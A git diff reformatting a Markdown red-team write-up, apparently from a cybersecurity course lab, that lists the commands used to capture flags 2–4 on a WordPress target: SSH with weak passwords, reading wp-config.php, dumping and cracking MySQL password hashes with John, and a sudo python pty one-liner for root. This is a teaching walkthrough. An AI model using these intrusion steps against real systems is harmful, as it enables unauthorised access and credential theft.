@@ -56,7 +56,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `Flag2: fc3fd58dcdad9ab23faca6e9a3e581c`   
     - **Exploit Used**
-      -  Same exploit covered in flag1 to gain access
+      - Same exploit covered in flag1 to gain access
       - Commands:
       - ssh michael@192.168.1.110
       - pw: michael
@@ -66,16 +66,17 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-2.png?raw=true" alt="Flag2"/>  
 
   - `Flag3: afc01ab56b50591e7dccf93122770cd2`   
-        - **Exploit Used**        
-          - Continue using michael's credentials; locate the wp-config.php, and use mysql to explore the database.     
-          - Once found, the wp-config.php displayed the db_password in plain text.
+    - **Exploit Used**        
+      - Continue using michael's credentials; locate the wp-config.php, and use mysql to explore the database.     
+      - Once found, the wp-config.php displayed the db_password in plain text.
 
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wp-config-php--location.png?raw=true" alt="wp_location"/>  
-          - cat wp-config-php       
+      - cat wp-config-php       
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wp-config_PWD.png?raw=true" alt="wp_passwd"/>  
 
-  `Flag3` was found in the wp_posts table in the wordpress database.   
----
+    `Flag3` was found in the wp_posts table in the wordpress database.   
+
+ ---
         - Commands:  
             - Connected to mysql: -u root -p'R@v3nSecurity'  
             - show databases;  
@@ -89,27 +90,27 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/FLAG-3_mysql_wp_posts.png?raw=true"/>
 
   - `Flag4: 715dea6c055b9fe3337544932f2941ce`:   
-            - **Exploit Used**    
-                - Use of weak salted hashes and Python root escalation Privileges.  
-                - Still using michaels credentials, gather the password hashes to crack.  
-                - The usernames and password hashes were copied to the kali server in a file (wp_hashes.txt), and cracked with John.  
-                - select * from wp_users;   
+        - **Exploit Used**    
+            - Use of weak salted hashes and Python root escalation Privileges.  
+            - Still using michaels credentials, gather the password hashes to crack.  
+            - The usernames and password hashes were copied to the kali server in a file (wp_hashes.txt), and cracked with John.  
+            - select * from wp_users;   
   <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/mysql_hashes.png?raw=true"/>
 
  - john wp_hashes.text
 
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Steven_Pink84.png?raw=true" style="height: 400px; width:600px;"/>
 
-              - use Steven credentials to ssh to target1 and escalate privileges to find flag4.  
-              - ssh steven@192.168.1.110
-              - pw: pink84
-              - sudo -l
-              - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’   
+          - use Steven credentials to ssh to target1 and escalate privileges to find flag4.  
+          - ssh steven@192.168.1.110
+          - pw: pink84
+          - sudo -l
+          - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’   
 
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/sudo-stephen.png?raw=true"/>
 
-              - cd /root
-              - ls
-              - cat flag4.txt      
+          - cd /root
+          - ls
+          - cat flag4.txt      
 
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Flag-4.png?raw=true"/>
